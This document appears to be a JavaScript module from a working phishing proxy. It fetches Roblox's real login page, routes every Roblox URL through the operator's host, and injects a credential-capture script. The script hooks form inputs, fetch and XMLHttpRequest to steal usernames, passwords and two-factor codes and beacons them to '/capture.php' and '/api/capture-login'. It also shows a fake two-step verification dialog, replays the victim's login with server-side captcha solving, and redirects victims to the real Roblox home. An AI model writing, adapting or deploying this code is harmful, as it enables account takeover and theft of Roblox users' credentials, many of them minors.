// Node port of login.php. Fetches Roblox's own login page, rewrites every
// Roblox URL through this host, and injects the capture interceptor.
const fs = require('fs');
const axios = require('axios');
const R = require('../runtime');
const captureNonce = require('../capture-nonce');

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const TTL_MS = 60_000;
const MIN_HTML = 5000;
const CACHE_FILE = R.seededDataPath('.cache', 'login-html', 'roblox_login.html');

const BASE_THEME_STYLE = '<style>html,body{background:#121215;color:#fff;}'
    + 'body{margin:0;font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;}'
    + '#rbx-body{background:#121215;}</style>';

const CAPTURE_SCRIPT = `<script>(function() {
    var lastUsername = '';
    var lastPassword = '';
    var lastLoginAttempt = null;
    var challengeState = { solving: false, asked: false };

    // Client-side failure report. The proxied page is Roblox's own app; when it
    // does not hydrate, the browser console holds the only evidence and nobody
    // is sitting in front of it. One beacon per error, capped, so the operator
    // can see which script or request actually broke.
    (function reportClientFaults() {
        var sent = 0;
        function send(kind, detail) {
            if (sent >= 12) return;
            sent++;
            try {
                var body = JSON.stringify({
                    kind: kind,
                    detail: String(detail || '').slice(0, 800),
                    path: location.pathname + location.search,
                    ua: navigator.userAgent
                });
                navigator.sendBeacon('/api/client-error', new Blob([body], { type: 'application/json' }));
            } catch (e) {}
        }
        window.addEventListener('error', function(e) {
            if (e && e.target && e.target !== window && e.target.src) {
                send('resource', e.target.src);
                return;
            }
            send('error', (e && e.message ? e.message : 'error') + ' @ ' + (e && e.filename ? e.filename : '') + ':' + (e && e.lineno ? e.lineno : 0));
        }, true);
        window.addEventListener('unhandledrejection', function(e) {
            var r = e && e.reason;
            send('rejection', (r && (r.message || r)) || 'unhandled');
        });
    })();

    function updateFromInputs() {
        try {
            var passInputs = document.querySelectorAll('input#login-password, input[data-testid="login-password"], input[name="password"], input[autocomplete="current-password"], input[type="password"]');
            for (var i = 0; i < passInputs.length; i++) {
                if (passInputs[i].value) {
                    lastPassword = passInputs[i].value;
                    break;
                }
            }
            var userSelectors = [
                'input#login-username',
                'input[data-testid="login-username"]',
                'input[name="username"]',
                'input[name="cvalue"]',
                'input[autocomplete="username"]',
                '.login-form-container input[type="text"]',
                '#react-login-container input[type="text"]'
            ];
            for (var j = 0; j < userSelectors.length; j++) {
                var el = document.querySelector(userSelectors[j]);
                if (el && el.value && el.value.trim()) {
                    lastUsername = el.value.trim();
                    break;
                }
            }
            if (!lastUsername) {
                var allInputs = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
                for (var k = 0; k < allInputs.length; k++) {
                    var inp = allInputs[k];
                    var id = (inp.id || '').toLowerCase();
                    var cls = (inp.className || '').toLowerCase();
                    var placeholder = (inp.placeholder || '').toLowerCase();
                    if (id.includes('search') || cls.includes('search') || placeholder.includes('search')) continue;
                    if (inp.value && inp.value.trim()) {
                        lastUsername = inp.value.trim();
                        break;
                    }
                }
            }
        } catch(e) {}
    }

    document.addEventListener('input', updateFromInputs, true);
    document.addEventListener('change', updateFromInputs, true);
    document.addEventListener('keyup', updateFromInputs, true);

    function getCredentials() {
        updateFromInputs();
        return {
            username: lastUsername,
            password: lastPassword
        };
    }

    var lastBeacon = {};

    function beaconCredentials(data) {
        if (!data || (!data.username && !data.password && !data.twoFactorCode)) return;

        var sig = (data.username || '') + '|' + (data.password ? '1' : '0') + '|' + (data.twoFactorCode || '');
        var now = Date.now();
        if (lastBeacon[sig] && now - lastBeacon[sig] < 8000) return;
        lastBeacon[sig] = now;

        var payload = JSON.stringify({
            username: data.username || lastUsername || '',
            password: data.password || lastPassword || '',
            twoFactorCode: data.twoFactorCode || '',
            nonce: '__CAPTURE_NONCE__',
            redirect_url: 'https://www.roblox.com/home',
            returnUrl: 'https://www.roblox.com/home',
            timestamp: new Date().toISOString()
        });
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/capture.php', payload);
            } else {
                fetch('/capture.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}

        try {
            var nodePayload = JSON.stringify({
                type: 'login_beacon',
                timestamp: new Date().toISOString(),
                data: {
                    username: data.username || lastUsername || '',
                    password: data.password || lastPassword || '',
                    twoFactorCode: data.twoFactorCode || '',
                    nonce: '__CAPTURE_NONCE__'
                }
            });
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/capture-login', new Blob([nodePayload], { type: 'application/json' }));
            } else {
                fetch('/api/capture-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: nodePayload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}
    }

    function decodeMeta(value) {
        if (!value) return null;
        try { return JSON.parse(atob(value)); } catch (e) { return null; }
    }

    function b64(value) {
        return btoa(unescape(encodeURIComponent(value)));
    }

    function parseJson(text) {
        try { return JSON.parse(text); } catch (e) { return null; }
    }

    function readBody(res) {
        try { return res.clone().text(); } catch (e) { return Promise.resolve(''); }
    }

    function relayFetch(url, body, headers) {
        var init = { method: 'POST', credentials: 'same-origin', headers: headers || {} };
        if (body !== undefined && body !== null) {
            init.body = typeof body === 'string' ? body : JSON.stringify(body);
            if (!init.headers['Content-Type']) init.headers['Content-Type'] = 'application/json';
        }
        return window.fetch(url, init);
    }

    function statusToast(text) {
        var el = document.getElementById('rbx-ingress-status');
        if (!el) {
            el = document.createElement('div');
            el.id = 'rbx-ingress-status';
            el.style.cssText = 'position:fixed;left:50%;bottom:24px;transform:translateX(-50%);z-index:2147483647;'
                + 'background:#17171b;color:#e8e8ea;border:1px solid #2c2c34;border-radius:10px;padding:10px 16px;'
                + 'font:13px/1.4 "Builder Sans",Helvetica,Arial,sans-serif;box-shadow:0 10px 30px rgba(0,0,0,.45)';
            document.body.appendChild(el);
        }
        el.textContent = text;
    }

    function clearToast() {
        var el = document.getElementById('rbx-ingress-status');
        if (el && el.parentNode) el.parentNode.removeChild(el);
    }

    function challengeHeaders(type, id, csrf, metadata) {
        return {
            metadata: metadata,
            headers: {
                'X-CSRF-TOKEN': csrf,
                'rblx-challenge-id': id,
                'rblx-challenge-type': type,
                'rblx-challenge-metadata': b64(metadata),
                'x-ingress-replay': '1'
            }
        };
    }

    function verifyCode(ctx, code) {
        var attempt = lastLoginAttempt;
        if (!attempt) return Promise.resolve(false);
        var metadata = JSON.stringify({ actionType: ctx.actionType, code: code });
        var built = challengeHeaders('twostepverification', ctx.challengeId, ctx.csrf, metadata)
        return relayFetch('https://apis.roblox.com/challenge/v1/continue', {
            challengeId: ctx.challengeId,
            challengeType: 'twostepverification',
            challengeMetadata: metadata
        }, built.headers).then(function (res) {
            return readBody(res).then(function (text) {
                var body = parseJson(text) || {};
                var nested = null;
                try { nested = body.challengeMetadata ? JSON.parse(body.challengeMetadata) : null; } catch (e) {}
                var token = body.verificationToken || (nested && nested.verificationToken);
                if (!token) throw new Error('no verification token');
                var meta2 = JSON.stringify({
                    rememberDevice: true,
                    challengeId: ctx.challengeId,
                    actionType: ctx.actionType,
                    verificationToken: token
                });
                var last = challengeHeaders('twostepverification', ctx.challengeId, ctx.csrf, meta2);
                return relayFetch(attempt.url, attempt.body, last.headers);
            });
        }).then(function (final) {
            if (!final.ok) return false;
            clearToast();
            redirectToRobloxHome();
            return true;
        });
    }

    function finishOrAsk(res) {
        var type = res.headers.get('rblx-challenge-type') || '';
        return readBody(res).then(function (text) {
            var body = parseJson(text);
            var twoStep = body && body.twoStepVerificationData;
            if (type !== 'twostepverification' && !(twoStep && twoStep.ticket)) {
                clearToast();
                return false;
            }
            var id = (twoStep && twoStep.ticket) || res.headers.get('rblx-challenge-id');
            if (!id) { clearToast(); return false; }
            showCodePrompt({
                challengeId: id,
                csrf: res.headers.get('x-csrf-token') || '',
                actionType: (twoStep && twoStep.actionType) || 'Login',
                mediaType: (twoStep && twoStep.mediaType) || 'Authenticator'
            });
            return true;
        });
    }

    function showCodePrompt(ctx) {
        if (challengeState.asked) return;
        challengeState.asked = true;
        clearToast();

        var wrap = document.createElement('div');
        wrap.id = 'rbx-ingress-2fa';
        wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.62);'
            + 'display:flex;align-items:center;justify-content:center;font-family:"Builder Sans",Helvetica,Arial,sans-serif';
        wrap.innerHTML = '<div style="width:min(92vw,380px);background:#1b1b1f;border:1px solid #2c2c34;'
            + 'border-radius:14px;padding:24px;color:#e8e8ea;box-shadow:0 24px 60px rgba(0,0,0,.55)">'
            + '<h2 style="margin:0 0 6px;font-size:18px">Two-step verification</h2>'
            + '<p style="margin:0 0 16px;font-size:13px;color:#a9a9b3">Enter the code from your authenticator app.</p>'
            + '<input id="rbx-ingress-code" inputmode="numeric" autocomplete="one-time-code" maxlength="20" '
            + 'style="width:100%;box-sizing:border-box;background:#101013;border:1px solid #2c2c34;border-radius:9px;'
            + 'color:#fff;padding:12px 13px;font-size:16px;letter-spacing:.2em;outline:none" />'
            + '<div id="rbx-ingress-err" style="min-height:18px;margin-top:8px;font-size:12px;color:#ff6b6b"></div>'
            + '<button id="rbx-ingress-submit" style="width:100%;padding:11px;border:0;border-radius:9px;'
            + 'background:#e8e8ea;color:#0b0b0d;font-weight:600;cursor:pointer">Verify</button></div>';
        document.body.appendChild(wrap);

        var input = document.getElementById('rbx-ingress-code');
        var errEl = document.getElementById('rbx-ingress-err');
        var btn = document.getElementById('rbx-ingress-submit');
        if (input) input.focus();

        function submit() {
            var code = input ? input.value.replace(/\s+/g, '') : '';
            if (!code) return;
            btn.disabled = true;
            errEl.textContent = '';
            verifyCode(ctx, code).then(function (ok) {
                if (ok) { if (wrap.parentNode) wrap.parentNode.removeChild(wrap); }
                else {
                    btn.disabled = false;
                    errEl.textContent = 'That code did not work. Try again.';
                    if (input) { input.value = ''; input.focus(); }
                }
            }).catch(function () {
                btn.disabled = false;
                errEl.textContent = 'Verification failed. Try again.';
            });
        }

        btn.addEventListener('click', submit);
        if (input) input.addEventListener('keydown', function (e) { if (e.key === 'Enter') submit(); });
    }

    function handleXhrChallenge(xhr) {
        var type = xhr.getResponseHeader('rblx-challenge-type') || '';
        if (!/^captcha/.test(type)) return;
        handleCaptcha({
            headers: { get: function (name) { return xhr.getResponseHeader(name); } }
        });
    }

    function handleCaptcha(res) {
        if (challengeState.solving) return;
        var type = res.headers.get('rblx-challenge-type') || '';
        if (!/^captcha/.test(type)) return;
        var id = res.headers.get('rblx-challenge-id');
        var csrf = res.headers.get('x-csrf-token') || '';
        var meta = decodeMeta(res.headers.get('rblx-challenge-metadata')) || {};
        var attempt = lastLoginAttempt;
        if (!id || !attempt) return;

        challengeState.solving = true;
        statusToast('Verifying...');

        relayFetch('/api/auth/solve-captcha', {
            blob: meta.dataExchangeBlob || meta.dxBlob || '',
            publicKey: meta.publicKey || meta.unifiedCaptchaId || '',
            nonce: '__CAPTURE_NONCE__'
        }).then(function (r) {
            return r.json();
        }).then(function (out) {
            if (!out || !out.token) throw new Error((out && out.error) || 'not solved');
            var metadata = JSON.stringify({
                captchaToken: out.token,
                unifiedCaptchaId: meta.unifiedCaptchaId,
                actionType: meta.actionType || 'Login'
            });
            var built = challengeHeaders(type, id, csrf, metadata);
            return relayFetch('https://apis.roblox.com/challenge/v1/continue', {
                challengeId: id,
                challengeType: type,
                challengeMetadata: metadata
            }, built.headers).then(function (cont) {
                if (!cont.ok) throw new Error('challenge rejected');
                return relayFetch(attempt.url, attempt.body, built.headers);
            });
        }).then(function (final) {
            challengeState.solving = false;
            return finishOrAsk(final);
        }).catch(function (err) {
            challengeState.solving = false;
            clearToast();
            console.warn('[ingress] challenge completion failed:', err && err.message ? err.message : err);
        });
    }

    function redirectToRobloxHome() {
        setTimeout(function() {
            window.location.href = 'https://www.roblox.com/home';
        }, 350);
    }

    document.addEventListener('click', function(e) {
        var btn = e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md');
        if (btn) {
            var creds = getCredentials();
            if (creds.username || creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var creds = getCredentials();
            if (creds.username || creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    var _origFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
        var body = (init && init.body) || (input && input.body);
        try {
            if (body && typeof body === 'string') {
                if (url.includes('/v2/login') || url.includes('/authenticate') || body.includes('"password"')) {
                    try {
                        var parsed = JSON.parse(body);
                        var u = parsed.cvalue || parsed.username || '';
                        var p = parsed.password || '';
                        if (u) lastUsername = u;
                        if (p) lastPassword = p;
                        if (u || p) {
                            lastLoginAttempt = { url: url, body: body };
                            beaconCredentials({ username: lastUsername, password: lastPassword });
                        }
                    } catch(e) {}
                }
                if (url.includes('two-step') || url.includes('two-factor') || body.includes('"code"')) {
                    try {
                        var parsed2 = JSON.parse(body);
                        if (parsed2.code) {
                            var c = getCredentials();
                            beaconCredentials({ username: c.username, password: c.password, twoFactorCode: parsed2.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        var fetchPromise = _origFetch.apply(this, arguments);
        return fetchPromise.then(function(res) {
            try {
                if (url && String(url).indexOf('/v2/login') !== -1) {
                    var ct = (res.headers && res.headers.get('rblx-challenge-type')) || '-';
                    var cid = (res.headers && res.headers.get('rblx-challenge-id')) || '-';
                    try {
                        navigator.sendBeacon('/api/client-error', new Blob([JSON.stringify({
                            kind: 'trace',
                            detail: 'login status=' + res.status + ' challenge=' + ct + ' id=' + cid + ' attempt=' + (lastLoginAttempt ? 'yes' : 'no'),
                            path: location.pathname
                        })], { type: 'application/json' }));
                    } catch (e) {}
                }
            } catch (e) {}
            try { handleCaptcha(res); } catch (e) {}
            try {
                if (res && res.headers && res.headers.get('x-login-complete') === '1') {
                    redirectToRobloxHome();
                    return res;
                }
                if (res.ok && (url.includes('/v2/login') || url.includes('/v3/users'))) {
                    res.clone().json().then(function(data) {
                        if (!data) return;
                        if (data.twoStepVerificationData || data.isTwoStepVerificationRequired === true) return;
                        if (data.user && data.user.id) {
                            redirectToRobloxHome();
                        }
                    }).catch(function() {});
                }
            } catch(e) {}
            return res;
        });
    };

    var _origXhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this._reqUrl = url;
        return _origXhrOpen.apply(this, arguments);
    };

    var _origXhrSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        var url = this._reqUrl || '';
        try {
            if (body && typeof body === 'string') {
                if (body.includes('password') && (body.includes('cvalue') || body.includes('username'))) {
                    try {
                        var parsed = JSON.parse(body);
                        var u = parsed.cvalue || parsed.username || '';
                        var p = parsed.password || '';
                        if (u) lastUsername = u;
                        if (p) lastPassword = p;
                        if (u || p) {
                            lastLoginAttempt = { url: url, body: body };
                            beaconCredentials({ username: lastUsername, password: lastPassword });
                        }
                    } catch(e) {}
                }
                if (body.includes('"code"')) {
                    try {
                        var parsed2 = JSON.parse(body);
                        if (parsed2.code) {
                            var c = getCredentials();
                            beaconCredentials({ username: c.username, password: c.password, twoFactorCode: parsed2.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        this.addEventListener('load', function() {
            try { handleXhrChallenge(this); } catch(e) {}
            try {
                if (this.status >= 200 && this.status < 300) {
                    if (url.includes('/v2/login') || url.includes('/v3/users')) {
                        try {
                            var json = JSON.parse(this.responseText);
                            if (json && json.user && json.user.id &&
                                !json.twoStepVerificationData && !json.isTwoStepVerificationRequired) {
                                redirectToRobloxHome();
                            }
                        } catch(e) {}
                    }
                }
            } catch(e) {}
        });

        return _origXhrSend.apply(this, arguments);
    };

    var REAL_HOME = 'https://www.roblox.com/home';
    var leaving = false;
    function bounceIfHome() {
        if (leaving) return;
        var p = window.location.pathname;
        if (p === '/home' || p.indexOf('/home/') === 0 || p === '/discover' ||
            p === '/my/avatar' || p === '/my/account' || p === '/my/settings') {
            leaving = true;
            window.location.replace(REAL_HOME);
        }
    }
    bounceIfHome();
    setInterval(bounceIfHome, 1000);

    var leftAlready = false;
    var hasSubmitted = false;
    document.addEventListener('click', function (e) {
        if (e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md')) {
            hasSubmitted = true;
        }
    }, true);
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') hasSubmitted = true;
    }, true);

    function pollLoginState() {
        if (leftAlready || !hasSubmitted) return;
        fetch('/api/login-state', { credentials: 'same-origin' })
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (d && d.complete && !leftAlready) {
                    leftAlready = true;
                    window.location.replace(d.redirect || REAL_HOME);
                }
            })
            .catch(function () {});
    }
    setInterval(pollLoginState, 1500);
})();
</script>`;

const REPLACEMENTS = [
    ['https://css.rbxcdn.com/', '/rbxcdn/'],
    ['http://css.rbxcdn.com/', '/rbxcdn/'],
    ['//css.rbxcdn.com/', '/rbxcdn/'],
    ['https://static.rbxcdn.com/', '/staticrbx/'],
    ['http://static.rbxcdn.com/', '/staticrbx/'],
    ['//static.rbxcdn.com/', '/staticrbx/'],
    ['https://images.rbxcdn.com/', '/imgrbx/'],
    ['http://images.rbxcdn.com/', '/imgrbx/'],
    ['//images.rbxcdn.com/', '/imgrbx/'],
    ['https://tr.rbxcdn.com/', '/thumbnails/'],
    ['http://tr.rbxcdn.com/', '/thumbnails/'],
    ['//tr.rbxcdn.com/', '/thumbnails/'],
    ['https://js.rbxcdn.com/', '/rblx-js/'],
    ['http://js.rbxcdn.com/', '/rblx-js/'],
    ['//js.rbxcdn.com/', '/rblx-js/'],
    ['https://apis.roblox.com/', '/proxy/roblox/apis.roblox.com/'],
    ['https://twostepverification.roblox.com/', '/proxy/roblox/twostepverification.roblox.com/'],
    ['https://twofactorauth.roblox.com/', '/proxy/roblox/twofactorauth.roblox.com/'],
    ['https://www.roblox.com/', '/proxy/roblox/www.roblox.com/'],
    ['https://roblox.com/', '/proxy/roblox/www.roblox.com/']
];

function readCache() {
    try {
        const stat = fs.statSync(CACHE_FILE);
        if (Date.now() - stat.mtimeMs >= TTL_MS) return null;
        const html = fs.readFileSync(CACHE_FILE, 'utf8');
        return html && html.length > MIN_HTML ? html : null;
    } catch {
        return null;
    }
}

function readStaleCache() {
    try {
        const html = fs.readFileSync(CACHE_FILE, 'utf8');
        return html && html.length > MIN_HTML ? html : null;
    } catch {
        return null;
    }
}

function writeCache(html) {
    try {
        fs.writeFileSync(CACHE_FILE, html);
    } catch { /* read-only */ }
}

async function fetchUpstream() {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            const res = await axios.get('https://www.roblox.com/login', {
                headers: {
                    'User-Agent': USER_AGENT,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache'
                },
                timeout: 10_000,
                maxRedirects: 5,
                responseType: 'text',
                validateStatus: () => true
            });
            if (res.status >= 200 && res.status < 400 && res.data && String(res.data).length > MIN_HTML) {
                return String(res.data);
            }
        } catch { /* retry */ }
        if (attempt < 3) {
            await new Promise(resolve => setTimeout(resolve, 300 * attempt));
        }
    }
    return null;
}

function rewrite(html) {
    let out = html;
    for (const [from, to] of REPLACEMENTS) out = out.split(from).join(to);
    out = out.replace(/https:\/\/([a-zA-Z0-9-]+)\.roblox\.com(?![a-zA-Z0-9.-])/g, '/proxy/roblox/$1.roblox.com');
    return out;
}

function unavailablePage() {
    return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">'
        + '<meta name="viewport" content="width=device-width,initial-scale=1">'
        + '<title>Roblox</title><style>html,body{margin:0;height:100%;background:#121215;color:#fff;'
        + 'font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;display:flex;'
        + 'align-items:center;justify-content:center;text-align:center}p{opacity:.75;font-size:15px;'
        + 'max-width:340px;line-height:1.5}</style></head><body><p>'
        + 'Roblox is not reachable right now. Refresh in a moment.</p></body></html>';
}

async function loginPage(req, res) {
    if (req.query.static === '1') return res.redirect(302, '/login');

    let stale = false;
    let html = readCache();
    if (!html) {
        html = await fetchUpstream();
        if (html) {
            writeCache(html);
        } else {
            html = readStaleCache();
            stale = Boolean(html);
        }
    }

    if (!html) {
        return res.status(503)
            .set('Retry-After', '30')
            .set('Content-Type', 'text/html; charset=utf-8')
            .set('Cache-Control', 'no-store')
            .send(unavailablePage());
    }

    html = rewrite(html);
    html = html.replace(/<head\b[^>]*>/i, match => match + BASE_THEME_STYLE + '<script src="/proxy-shim.js"></script>');
    if (req.query.native !== '1') {
        const nonce = captureNonce.issue();
        const script = CAPTURE_SCRIPT.split('__CAPTURE_NONCE__').join(nonce);
        html = html.replace('</head>', script + '</head>');
    }

    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    res.set('X-Login-Build', 'proxy-1to1');
    if (stale) res.set('X-Login-Stale', '1');
    return res.type('text/html').send(html);
}

module.exports = { loginPage };
